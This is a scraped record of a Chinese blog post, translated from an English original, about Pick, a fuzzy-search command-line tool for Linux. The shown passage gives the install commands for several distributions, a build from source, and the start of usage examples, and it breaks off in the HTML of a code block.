{"url_object_id": "d9bc9c062a769388a3915d069b5fe2f3", "title": "Pick：一款 Linux 上的命令行模糊搜索工具", "url": "http://blog.jobbole.com/113480/", "create_date": "2018/01/15", "front_img_url": ["http://jbcdn2.b0.upaiyun.com/2018/01/7d112f146569e6ad0cf3eb62defddc10.png"], "praise_nums": 1, "comment_nums": 0, "favor_nums": 0, "tags": "工具与资源,Linux,Pick", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://www.ostechnix.com/pick-commandline-fuzzy-search-tool-linux/\">Sk</a>   译文出处：<a target=\"_blank\" href=\"https://linux.cn/article-9234-1.html\">lujun9972</a>   </div><p>今天，我们要讲的是一款有趣的命令行工具，名叫 Pick。它允许用户通过 ncurses(3X) 界面来从一系列选项中进行选择，而且还支持模糊搜索的功能。当你想要选择某个名字中包含非英文字符的目录或文件时，这款工具就很有用了。你根本都无需学习如何输入非英文字符。借助 Pick，你可以很方便地进行搜索、选择，然后浏览该文件或进入该目录。你甚至无需输入任何字符来过滤文件/目录。这很适合那些有大量目录和文件的人来用。</p>\n<h3 id=\"toc_1\">安装 Pick</h3>\n<p>对 Arch Linux 及其衍生品来说，Pick 放在 <a href=\"https://aur.archlinux.org/packages/pick/\">AUR</a> 中。因此 Arch 用户可以使用类似 <a href=\"https://www.ostechnix.com/install-pacaur-arch-linux/\">Pacaur</a>，<a href=\"https://www.ostechnix.com/install-packer-arch-linux-2/\">Packer</a>，以及 <a href=\"https://www.ostechnix.com/install-yaourt-arch-linux/\">Yaourt</a> 等 AUR 辅助工具来安装它。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a635abeba9d9771654754\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\npacaur -S pick\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a635abeba9d9771654754-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635abeba9d9771654754-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a635abeba9d9771654754-1\"><span class=\"crayon-v\">pacaur</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">S</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">pick</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635abeba9d9771654754-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>或者，</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a635abeba9e2186585344\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\npacker -S pick\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a635abeba9e2186585344-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635abeba9e2186585344-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a635abeba9e2186585344-1\"><span class=\"crayon-v\">packer</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">S</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">pick</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635abeba9e2186585344-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>或者，</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a635abeba9e6224736487\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nyaourt -S pick\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a635abeba9e6224736487-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635abeba9e6224736487-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a635abeba9e6224736487-1\"><span class=\"crayon-v\">yaourt</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">S</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">pick</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635abeba9e6224736487-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>Debian，Ubuntu，Linux Mint 用户则可以通过运行下面命令来安装 Pick。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a635abeba9e9456840581\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nsudo apt-get install pick\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a635abeba9e9456840581-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635abeba9e9456840581-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a635abeba9e9456840581-1\"><span class=\"crayon-e\">sudo </span><span class=\"crayon-v\">apt</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">get </span><span class=\"crayon-e\">install </span><span class=\"crayon-i\">pick</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635abeba9e9456840581-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>其他的发行版则可以从<a href=\"https://github.com/calleerlandsson/pick/releases/\">这里</a>下载最新的安装包，然后按照下面的步骤来安装。在写本指南时，其最新版为 1.9.0。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a635abeba9ed333921431\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nwget https://github.com/calleerlandsson/pick/releases/download/v1.9.0/pick-1.9.0.tar.gz\r\ntar -zxvf pick-1.9.0.tar.gz\r\ncd pick-1.9.0/\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a635abeba9ed333921431-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635abeba9ed333921431-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a635abeba9ed333921431-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635abeba9ed333921431-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a635abeba9ed333921431-1\"><span class=\"crayon-e\">wget </span><span class=\"crayon-v\">https</span><span class=\"crayon-o\">:</span><span class=\"crayon-c\">//github.com/calleerlandsson/pick/releases/download/v1.9.0/pick-1.9.0.tar.gz</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635abeba9ed333921431-2\"><span class=\"crayon-v\">tar</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">zxvf </span><span class=\"crayon-v\">pick</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">1.9.0.tar.gz</span></div><div class=\"crayon-line\" id=\"crayon-5a635abeba9ed333921431-3\"><span class=\"crayon-e\">cd </span><span class=\"crayon-v\">pick</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">1.9.0</span><span class=\"crayon-o\">/</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635abeba9ed333921431-4\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>使用下面命令进行配置：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a635abeba9f0962391406\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n./configure\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a635abeba9f0962391406-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635abeba9f0962391406-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a635abeba9f0962391406-1\"><span class=\"crayon-sy\">.</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">configure</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635abeba9f0962391406-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p>最后，构建并安装 Pick：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a635abeba9f3458635502\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nmake\r\nsudo make install\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a635abeba9f3458635502-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635abeba9f3458635502-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a635abeba9f3458635502-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a635abeba9f3458635502-1\"><span class=\"crayon-e\">make</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635abeba9f3458635502-2\"><span class=\"crayon-e\">sudo </span><span class=\"crayon-e\">make </span><span class=\"crayon-i\">install</span></div><div class=\"crayon-line\" id=\"crayon-5a635abeba9f3458635502-3\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p></p>\n<h3 id=\"toc_2\">用法</h3>\n<p>通过将它与其他命令集成能够大幅简化你的工作。我这里会给出一些例子，让你理解它是怎么工作的。</p>\n<p>让们先创建一堆目录。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a635abeba9f6955631818\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nmkdir -p abcd/efgh/ijkl/mnop/qrst/uvwx/yz/\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a635abeba9f6955631818-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635abeba9f6955631818-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a635abeba9f6955631818-1\"><span class=\"crayon-v\">mkdir</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">p</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">abcd</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">efgh</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">ijkl</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">mnop</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">qrst</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">uvwx</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">yz</span><span class=\"crayon-o\">/</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635abeba9f6955631818-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>现在，你想进入目录 <code>/ijkl/</code>。你有两种选择。可以使用 <code>cd</code> 命令：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a635abeba9f9274126013\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div 